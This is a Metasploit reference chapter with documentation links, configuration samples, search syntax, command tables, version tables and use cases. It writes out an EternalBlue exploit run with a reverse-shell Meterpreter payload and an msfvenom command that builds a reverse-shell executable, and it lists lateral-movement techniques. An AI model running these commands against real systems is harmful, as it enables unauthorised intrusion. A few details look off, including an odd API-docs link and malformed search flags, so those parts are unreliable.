# Standards & Reference

## 7.1 Official Documentation

- [Rapid7 Metasploit Documentation](https://docs.rapid7.com/metasploit/)
- [Metasploit Framework GitHub](https://github.com/rapid7/metasploit-framework)
- [Metasploit Wiki](https://github.com/rapid7/metasploit-framework/wiki)
- [Metasploit Community/Express/Pro Docs](https://www.rapid7.com/products/metasploit/)
- [Rapid7 Exploit Database](https://www.rapid7.com/db/modules/)
- [Metasploit API Documentation](https://rdocritual.net/metasploit-framework/)
- [Offensive Security Metasploit Guide](https://www.offensive-security.com/metasploit-unleashed/)

## 7.2 Configuration Reference

### Framework Configuration (msfconsole)

```ruby
# ~/.msf4/msfconsole.rc or /etc/metasploit/msfconsole.rc
# Auto-run commands on startup

# Set default workspace
workspace -a Pentest2024

# Set console logging
set ConsoleLogging true
set LogLevel 5

# Configure database
db_connect postgres:metasploit@127.0.0.1:5432/msfbook

# Set global variables
set GATEWAY 10.0.0.1
set NETMASK 255.255.255.0
set THREADS 10
set VERBOSE true

# Enable color
set EnableContextEncoding false
set MeterpreterTrace false
```

### Database Configuration

```yaml
# /etc/metasploit/database.yml (if using PostgreSQL)

production:
  adapter: postgresql
  database: msf
  username: msf
  password: <strong_password>
  host: 127.0.0.1
  port: 5432
  pool: 5
  timeout: 5

# Starting database services
systemctl start postgresql
msfdb init
msfdb start
```

### Module Search Syntax

```bash
# Search by name
search type:exploit name:smb

# Search by platform
search platform:windows

# Search by rank
search rank:excellent

# Search by CVE
search cve:2023-44487

# Search by module type
search type:auxiliary

# Combine filters
search cve:2023 name:apache platform:linux

# Search exploits only
search --type:exploit

# Search payloads
search --type:payload windows/x64
```

### Module Structure

```
modules/
├── exploits/           # Exploit modules
│   ├── windows/
│   │   ├── smb/
│   │   │   └── ms17_010_eternalblue.rb
│   │   └── ftp/
│   ├── linux/
│   ├── unix/
│   └── multi/
├── payloads/          # Standalone payloads
│   ├── singles/
│   ├── stagers/
│   └── stages/
├── auxiliary/         # Scanner, DoS, etc
│   ├── scanners/
│   ├── fuzzers/
│   └── sniffer/
├── post/              # Post-exploitation
│   ├── windows/
│   ├── linux/
│   └── multi/
├── encoders/         # Payload encoding
├── nops/              # No-operation slides
└── evasion/           # AV evasion
```

## 7.3 Common Commands

| Command | Description |
|---------|-------------|
| `msfconsole` | Start Metasploit console |
| `msfvenom -l` | List all payloads |
| `msfvenom -l encoders` | List encoders |
| `msfdb init` | Initialize database |
| `db_status` | Check database connection |

### Core Console Commands

| Command | Shortcut | Description |
|---------|----------|-------------|
| `help <command>` | `?` | Show help |
| `search <query>` | - | Search modules |
| `use <module>` | `u` | Select module |
| `show options` | `show opt` | Show module options |
| `show payloads` | - | Show compatible payloads |
| `show targets` | - | Show target systems |
| `set <option> <value>` | - | Set option |
| `unset <option>` | - | Unset option |
| `setg <option> <value>` | - | Set global option |
| `run` | `exploit` | Execute module |
| `back` | - | Exit current module |
| `exit` | `quit` | Exit Metasploit |
| `info` | `i` | Show module info |
| `sessions` | `sess` | List active sessions |
| `jobs` | - | List running jobs |
| `resource <file>` | - | Run resource script |

### Module Syntax Examples

```bash
# Exploit a target
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.5
set LPORT 4444
exploit

# Run auxiliary scanner
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.10.10.0/24
set THREADS 50
run

# Generate payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f exe -o shell.exe
```

## 7.4 Version Compatibility

| Version | Status | Notes |
|---------|--------|-------|
| Metasploit 6.4.x | Current | Pro, Community, Framework |
| Metasploit 6.3.x | Supported | Ruby 3.x compatibility |
| Metasploit 6.0.x | Legacy | Deprecated modules |
| Metasploit 5.x | Legacy | Some modules still valid |
| Metasploit Community | Current | Free tier with limitations |
| Metasploit Pro | Current | Commercial features |
| Armitage | Deprecated | Use Metasploit Community |

### Ruby & Environment Requirements

| Metasploit Version | Ruby Version | Database |
|-------------------|--------------|----------|
| 6.4.x | Ruby 3.0-3.2 | PostgreSQL 12+ |
| 6.3.x | Ruby 2.7-3.1 | PostgreSQL 10+ |
| 6.0.x | Ruby 2.5-2.7 | PostgreSQL 9.6+ |

## 7.5 Use Cases

| Use Case | Modules Used | Approach |
|----------|-------------|----------|
| Network enumeration | `auxiliary/scanner/*` | Sweep network for services |
| Vulnerability scanning | `auxiliary/scanner/discovery/*` | Identify live hosts, services |
| Exploitation | `exploit/*` | Use known vulnerabilities |
| Post-exploitation | `post/*` | Escalate, pivot, collect |
| Password attacks | `auxiliary/scanner/http/*` | Brute force, credential stuffing |
| Client-side attacks | `exploit/multi/*` | Phishing, macro exploits |
| Web application | Not primary | Use Burp Suite for web testing |
| Lateral movement | `post/windows/*`, `post/linux/*` | Pass-the-hash, token stealing |
